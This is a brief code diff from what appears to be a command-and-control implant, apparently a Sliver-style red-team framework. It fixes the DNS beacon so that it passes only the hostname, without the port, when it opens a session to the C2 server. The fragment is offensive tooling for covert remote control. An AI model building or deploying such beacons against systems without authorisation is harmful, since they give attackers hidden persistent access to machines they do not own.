@@ -343,7 +343,7 @@ func dnsBeacon(uri *url.URL) *Beacon {
 		ActiveC2: uri.String(),
 		Init: func() error {
 			opts := dnsclient.ParseDNSOptions(uri)
-			client, err = dnsclient.DNSStartSession(uri.Host, opts)
+			client, err = dnsclient.DNSStartSession(uri.Hostname(), opts)
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("[beacon] dns connection error %s", err)
